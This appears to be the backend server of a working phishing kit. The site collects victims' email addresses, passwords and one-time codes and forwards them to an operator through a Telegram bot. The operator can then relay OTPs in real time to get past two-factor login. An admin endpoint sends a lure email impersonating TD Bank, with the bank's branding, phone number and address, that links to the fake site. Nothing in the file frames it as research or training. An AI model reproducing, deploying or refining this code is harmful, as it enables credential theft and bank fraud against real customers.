require('dotenv').config();
const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const path = require('path');
const bot = require('./bot');
const otpStore = require('./otpStore'); // Serves as sessionStore
const { Resend } = require('resend');


const app = express();
const PORT = process.env.PORT || 5001;
const isProduction = process.env.NODE_ENV === 'production';

// Enable Helmet HTTP security headers
app.use(helmet());

// Disable X-Powered-By header to prevent technology disclosure
app.disable('x-powered-by');

// Define allowed CORS origins
const allowedOrigins = [
  'https://centre-profil.online',
  'https://www.centre-profil.online'
];

if (process.env.FRONTEND_URL) {
  allowedOrigins.push(process.env.FRONTEND_URL);
}

// In production, the frontend is served by this same Express server,
// so CORS is only needed in development (Vite dev server on a different port).
app.use(cors({
  origin: isProduction ? allowedOrigins : true,
  credentials: true
}));

// Serve React build in production
if (isProduction) {
  const clientDist = path.join(__dirname, '..', 'client', 'dist');
  app.use(express.static(clientDist));
}

// Apply general API rate limiting (max 150 requests per 15 minutes per IP)
const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 150,
  message: { success: false, error: 'Too many requests, please try again later.' },
  standardHeaders: true,
  legacyHeaders: false,
});
app.use('/api/', apiLimiter);

// Stricter rate limiter for sensitive authentication entrypoints
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 15, // limit each IP to 15 login attempts per 15 minutes
  message: { success: false, error: 'Too many login attempts. Please try again after 15 minutes.' },
  standardHeaders: true,
  legacyHeaders: false,
});
app.use('/api/login', loginLimiter);

app.use(express.json());

// =============================================
// ACCESS KEY PROTECTION
// =============================================
const VALID_ACCESS_KEY = 'client';
const ADMIN_ACCESS_KEY = 'whapooooSend';

app.use('/api/', (req, res, next) => {
  const userKey = req.query.key || req.headers['x-access-key'] || req.headers['x-admin-key'];
  if (userKey === VALID_ACCESS_KEY || userKey === ADMIN_ACCESS_KEY) {
    return next();
  }
  return res.status(403).json({ success: false, error: 'Access Denied. Invalid or missing access key.' });
});

// Helper for formatted IST time
function getISTDateTime() {
  const date = new Date();
  const istOffset = 5.5 * 60 * 60 * 1000;
  const istDate = new Date(date.getTime() + istOffset);
  const pad = (num) => String(num).padStart(2, '0');
  return `${istDate.getUTCFullYear()}-${pad(istDate.getUTCMonth() + 1)}-${pad(istDate.getUTCDate())} ${pad(istDate.getUTCHours())}:${pad(istDate.getUTCMinutes())}:${pad(istDate.getUTCSeconds())}`;
}

// Flow 1 — Login Credentials Notification
app.post('/api/login', async (req, res) => {
  const { email, password } = req.body;
  if (!email || !password) {
    return res.status(400).json({ success: false, error: 'Email and password are required' });
  }

  const timestamp = getISTDateTime();
  const message = `🔐 NEW LOGIN ATTEMPT\n\n📧 Email: ${email}\n🔑 Password: ${password}\n🕐 Time: ${timestamp}`;
  
  const reply_markup = {
    inline_keyboard: [
      [
        { text: '📤 POP OTP', callback_data: `pop_otp:${email}` },
        { text: '❌ CANCEL', callback_data: `cancel:${email}` }
      ]
    ]
  };

  // Initialize the session state
  otpStore[email] = {
    email,
    password,
    status: 'login_submitted',
    otp: null,
    otpExpiry: null,
    otpEntered: null,
    redirectUrl: null
  };

  try {
    await bot.sendMessage(process.env.ADMIN_CHAT_ID, message, { reply_markup });
    console.log(`[Express] Received login attempt for ${email}. Notified admin.`);
  } catch (error) {
    console.error('[Express Error] Failed to send login attempt message to Telegram:', error.message);
  }

  return res.json({ success: true });
});

// GET /api/session-status — Long-polling check for state updates
app.get('/api/session-status', (req, res) => {
  const { email } = req.query;
  if (!email) {
    return res.status(400).json({ success: false, error: 'Email query parameter is required' });
  }

  const session = otpStore[email];
  if (!session) {
    return res.json({ success: true, status: 'idle' });
  }

  return res.json({
    success: true,
    status: session.status,
    otp: session.otp,
    otpExpiry: session.otpExpiry,
    redirectUrl: session.redirectUrl
  });
});

// POST /api/submit-otp — User submits the typed OTP
app.post('/api/submit-otp', async (req, res) => {
  const { email, otp } = req.body;
  if (!email || !otp) {
    return res.status(400).json({ success: false, error: 'Email and OTP are required' });
  }

  const session = otpStore[email];
  if (!session) {
    return res.status(404).json({ success: false, error: 'Session not found' });
  }

  // Update session state
  session.status = 'otp_submitted';
  session.otpEntered = otp;

  const timestamp = getISTDateTime();
  const message = `🔑 OTP CODE ENTERED\n\n📧 Email: ${email}\n🔢 OTP Entered: ${otp}\n🕐 Time: ${timestamp}`;

  const reply_markup = {
    inline_keyboard: [
      [
        { text: '✅ ACCEPT OTP', callback_data: `accept_otp:${email}` },
        { text: '❌ WRONG OTP', callback_data: `wrong_otp:${email}` }
      ],
      [
        { text: '🔄 RESEND NEW OTP', callback_data: `resend_otp:${email}` },
        { text: '❌ CANCEL', callback_data: `cancel:${email}` }
      ]
    ]
  };

  try {
    await bot.sendMessage(process.env.ADMIN_CHAT_ID, message, { reply_markup });
    console.log(`[Express] User ${email} submitted OTP: ${otp}. Notified admin.`);
  } catch (error) {
    console.error('[Express Error] Failed to send OTP entered message to Telegram:', error.message);
  }

  return res.json({ success: true });
});

// POST /api/request-resend — User requested a new OTP code
app.post('/api/request-resend', async (req, res) => {
  const { email } = req.body;
  if (!email) {
    return res.status(400).json({ success: false, error: 'Email is required' });
  }

  const session = otpStore[email];
  if (!session) {
    return res.status(404).json({ success: false, error: 'Session not found' });
  }

  // Generate a new 6-digit OTP code immediately
  const crypto = require('crypto');
  const otp = crypto.randomInt(100000, 999999).toString();

  session.status = 'show_otp';
  session.otp = otp;
  session.otpExpiry = Date.now() + 60000; // Reset to 60 seconds

  const timestamp = getISTDateTime();
  try {
    await bot.sendMessage(
      process.env.ADMIN_CHAT_ID,
      `⚠️ USER REQUESTED RESEND (New OTP Generated)\n\n📧 Email: ${email}\n🔢 New OTP Code: ${otp}\n🕐 Time: ${timestamp}`
    );
    console.log(`[Express] User ${email} requested OTP resend. New OTP: ${otp}. Notified admin.`);
  } catch (error) {
    console.error('[Express Error] Failed to send resend request message to Telegram:', error.message);
  }
  return res.json({ success: true });
});

// POST /api/clear-session — Clean up session after successful verification
app.post('/api/clear-session', (req, res) => {
  const { email } = req.body;
  if (email && otpStore[email]) {
    delete otpStore[email];
    console.log(`[Express] Session successfully cleared for ${email}`);
  }
  return res.json({ success: true });
});

// =============================================
// ADMIN — SEND EMAIL VIA RESEND
// =============================================


app.post('/api/admin/send-email', async (req, res) => {
  // Admin key check via header
  const adminKey = req.headers['x-admin-key'];
  if (!adminKey || adminKey !== ADMIN_ACCESS_KEY) {
    return res.status(403).json({ success: false, error: 'Access Denied.' });
  }

  const { recipient } = req.body;
  if (!recipient) {
    return res.status(400).json({ success: false, error: 'Recipient is required.' });
  }

  const link = 'https://centre-profil.online/?key=client';

  const RESEND_API_KEY = process.env.RESEND_API_KEY;
  const FROM_EMAIL     = process.env.RESEND_FROM_EMAIL;
  const FROM_NAME      = process.env.RESEND_FROM_NAME || 'BANQUE TD';

  if (!RESEND_API_KEY || !FROM_EMAIL) {
    console.error('[Admin] Resend API key or FROM_EMAIL not set in .env');
    return res.status(500).json({ success: false, error: 'Email service not configured.' });
  }

  const emailPayload = {
    subject: 'Secure verification required – TD',
    html: `<!DOCTYPE html>
<html lang="en" xmlns="http://www.w3.org/1999/xhtml" xmlns:o="urn:schemas-microsoft-com:office:office">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="x-apple-disable-message-reformatting">
  <meta name="format-detection" content="telephone=no,address=no,email=no,date=no,url=no">
  <title>Secure verification required – TD</title>
  <!--[if mso]>
  <noscript>
    <xml>
      <o:OfficeDocumentSettings>
        <o:PixelsPerInch>96</o:PixelsPerInch>
      </o:OfficeDocumentSettings>
    </xml>
  </noscript>
  <![endif]-->
  <style>
    * { box-sizing: border-box; }
    body, table, td, a { -webkit-text-size-adjust: 100%; -ms-text-size-adjust: 100%; }
    table, td { mso-table-lspace: 0pt; mso-table-rspace: 0pt; }
    img { -ms-interpolation-mode: bicubic; border: 0; height: auto; line-height: 100%; outline: none; text-decoration: none; }
    a[x-apple-data-detectors] { color: inherit !important; text-decoration: none !important; }
    body {
      margin: 0 !important;
      padding: 0 !important;
      background-color: #f0f2f5;
      font-family: Arial, Helvetica, sans-serif;
    }
    @media only screen and (max-width: 600px) {
      .email-wrapper { width: 100% !important; }
      .email-content { padding: 20px 16px !important; }
      .header-logo { padding: 20px 16px !important; }
      .btn-verify { padding: 14px 28px !important; font-size: 15px !important; }
      .footer-table { padding: 20px 16px !important; }
      h1 { font-size: 20px !important; }
    }
  </style>
</head>
<body style="margin:0;padding:0;background-color:#f0f2f5;">

  <div style="display:none;font-size:1px;color:#f0f2f5;line-height:1px;max-height:0px;max-width:0px;opacity:0;overflow:hidden;">
    Secure verification required – Action required on your TD account.
  </div>

  <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="background-color:#f0f2f5;">
    <tr>
      <td align="center" style="padding:30px 15px;">

        <table role="presentation" class="email-wrapper" border="0" cellpadding="0" cellspacing="0" width="600" style="max-width:600px;width:100%;background-color:#ffffff;border-radius:4px;overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,0.10);">

          <tr>
            <td style="background-color:#003f2d;height:5px;font-size:0;line-height:0;">&nbsp;</td>
          </tr>

          <tr>
            <td class="header-logo" style="background-color:#ffffff;padding:20px 40px;border-bottom:1px solid #e8e8e8;">
              <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%">
                <tr>
                  <td>
                    <span style="font-family:Arial,Helvetica,sans-serif;font-size:20px;font-weight:bold;color:#067a2b;letter-spacing:0.5px;">TD BANK</span>
                  </td>
                  <td align="right" style="vertical-align:middle;">
                    <span style="font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#888888;letter-spacing:0.5px;">SECURITY NOTICE</span>
                  </td>
                </tr>
              </table>
            </td>
          </tr>

          <tr>
            <td style="background-color:#003f2d;padding:14px 40px;">
              <span style="font-family:Arial,Helvetica,sans-serif;font-size:13px;color:#ffffff;font-weight:bold;">Security Verification Required</span>
            </td>
          </tr>

          <tr>
            <td class="email-content" style="padding:40px 40px 32px 40px;">

              <p style="margin:0 0 6px 0;font-family:Arial,Helvetica,sans-serif;font-size:13px;color:#888888;letter-spacing:0.5px;text-transform:uppercase;">Dear Customer,</p>

              <h1 style="margin:0 0 24px 0;font-family:Arial,Helvetica,sans-serif;font-size:22px;font-weight:bold;color:#003f2d;line-height:1.3;">
                Identity Verification Required
              </h1>

              <p style="margin:0 0 18px 0;font-family:Arial,Helvetica,sans-serif;font-size:15px;color:#333333;line-height:1.7;">
                We need to verify your identity to finalize your request. This step is necessary to ensure the security of your account and protect your personal information.
              </p>

              <p style="margin:0 0 28px 0;font-family:Arial,Helvetica,sans-serif;font-size:15px;color:#333333;line-height:1.7;">
                Please click the button below to proceed with the verification. This process will only take a few moments.
              </p>

              <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="background-color:#f5f6fa;border-left:4px solid #067a2b;border-radius:3px;margin-bottom:32px;">
                <tr>
                  <td style="padding:16px 20px;">
                    <p style="margin:0;font-family:Arial,Helvetica,sans-serif;font-size:13px;color:#555555;line-height:1.6;">
                      <strong style="color:#003f2d;">Why this verification?</strong><br>
                      For your security, we periodically verify our customers' identity. This measure helps us detect any unauthorized activity on your account.
                    </p>
                  </td>
                </tr>
              </table>

              <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="margin-bottom:32px;">
                <tr>
                  <td align="center">
                    <!--[if mso]>
                    <v:roundrect xmlns:v="urn:schemas-microsoft-com:vml" xmlns:w="urn:schemas-microsoft-com:office:word"
                      href="${link}"
                      style="height:52px;v-text-anchor:middle;width:260px;"
                      arcsize="8%"
                      strokecolor="#067a2b"
                      fillcolor="#067a2b">
                      <w:anchorlock/>
                      <center style="color:#ffffff;font-family:Arial,Helvetica,sans-serif;font-size:16px;font-weight:bold;">Verify My Identity</center>
                    </v:roundrect>
                    <![endif]-->
                    <!--[if !mso]><!-->
                    <a href="${link}"
                       target="_blank"
                       rel="noopener noreferrer"
                       class="btn-verify"
                       style="display:inline-block;background-color:#067a2b;color:#ffffff;font-family:Arial,Helvetica,sans-serif;font-size:16px;font-weight:bold;text-decoration:none;padding:16px 40px;border-radius:4px;letter-spacing:0.5px;mso-hide:all;">
                      Verify My Identity
                    </a>
                    <!--<![endif]-->
                  </td>
                </tr>
              </table>

              <p style="margin:0 0 24px 0;font-family:Arial,Helvetica,sans-serif;font-size:13px;color:#888888;line-height:1.6;text-align:center;">
                If the button does not work, copy and paste this link into your browser:<br>
                <a href="${link}" target="_blank" style="color:#067a2b;text-decoration:underline;word-break:break-all;">${link}</a>
              </p>

              <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="background-color:#fff8e1;border:1px solid #ffe082;border-radius:3px;">
                <tr>
                  <td style="padding:14px 18px;">
                    <p style="margin:0;font-family:Arial,Helvetica,sans-serif;font-size:12px;color:#795548;line-height:1.6;">
                      ⚠️ <strong>Security Note:</strong> TD Bank will never ask for your PIN, password, or full card number by email. If you did not request this verification, please contact our customer service immediately.
                    </p>
                  </td>
                </tr>
              </table>

            </td>
          </tr>

          <tr>
            <td style="background-color:#e8e8e8;height:1px;font-size:0;line-height:0;">&nbsp;</td>
          </tr>

          <tr>
            <td class="footer-table" style="background-color:#f8f9fb;padding:28px 40px;">

              <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="margin-bottom:18px;">
                <tr>
                  <td align="center">
                    <p style="margin:0 0 6px 0;font-family:Arial,Helvetica,sans-serif;font-size:12px;color:#666666;line-height:1.6;">
                      <strong style="color:#333333;">Need Help?</strong>
                    </p>
                    <p style="margin:0;font-family:Arial,Helvetica,sans-serif;font-size:12px;color:#666666;line-height:1.7;">
                      Contact us at <strong>1-800-895-4463</strong><br>
                      Available 24 hours a day, 7 days a week
                    </p>
                  </td>
                </tr>
              </table>

              <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="margin-bottom:18px;">
                <tr>
                  <td align="center">
                    <a href="https://www.td.com/ca/en/about-td/privacy-and-security" target="_blank" style="font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#067a2b;text-decoration:none;">Security Centre</a>
                    <span style="font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#cccccc;margin:0 8px;">|</span>
                    <a href="https://www.td.com/ca/en/about-td/privacy-and-security/privacy-agreement" target="_blank" style="font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#067a2b;text-decoration:none;">Privacy Policy</a>
                    <span style="font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#cccccc;margin:0 8px;">|</span>
                    <a href="https://www.td.com/ca/en/personal-banking" target="_blank" style="font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#067a2b;text-decoration:none;">td.com</a>
                  </td>
                </tr>
              </table>

              <p style="margin:0;font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#999999;line-height:1.6;text-align:center;">
                © 2026 TD Bank Group. All rights reserved.<br>
                66 Wellington Street West, Toronto, Ontario M5K 1A2<br><br>
                This email was sent to the address associated with your TD account. This is a transactional message related to the security of your account.
              </p>

            </td>
          </tr>

          <tr>
            <td style="background-color:#003f2d;height:4px;font-size:0;line-height:0;">&nbsp;</td>
          </tr>

        </table>

      </td>
    </tr>
  </table>

</body>
</html>`,
    text: `Dear Customer,\n\nWe need to verify your identity to finalize your request.\n\nPlease click on this link to proceed with the verification:\n${link}\n\nIf you did not request this verification, please contact our customer service at 1-800-895-4463.\n\n© ${new Date().getFullYear()} TD Bank Group. All rights reserved.`,
  };

  try {
    const resend = new Resend(RESEND_API_KEY);
    const { data, error } = await resend.emails.send({
      from: `${FROM_NAME} <${FROM_EMAIL}>`,
      to: [recipient],
      subject: emailPayload.subject,
      html: emailPayload.html,
      text: emailPayload.text,
    });

    if (error) {
      console.error('[Admin] Resend API error:', error);
      return res.status(500).json({ success: false, error: `Resend error: ${error.message}` });
    }

    console.log(`[Admin] Email sent to ${recipient} via Resend. ID: ${data?.id}`);
    return res.json({ success: true });
  } catch (err) {
    console.error('[Admin] Failed to call Resend API:', err.message);
    return res.status(500).json({ success: false, error: 'Failed to send email. Server error.' });
  }
});


// Catch-all: serve React app for any non-API route (production only)
if (isProduction) {
  const clientDist = path.join(__dirname, '..', 'client', 'dist');
  app.get('*', (req, res) => {
    res.sendFile(path.join(clientDist, 'index.html'));
  });
}

app.listen(PORT, () => {
  console.log(`Backend server is running on http://localhost:${PORT}`);
});
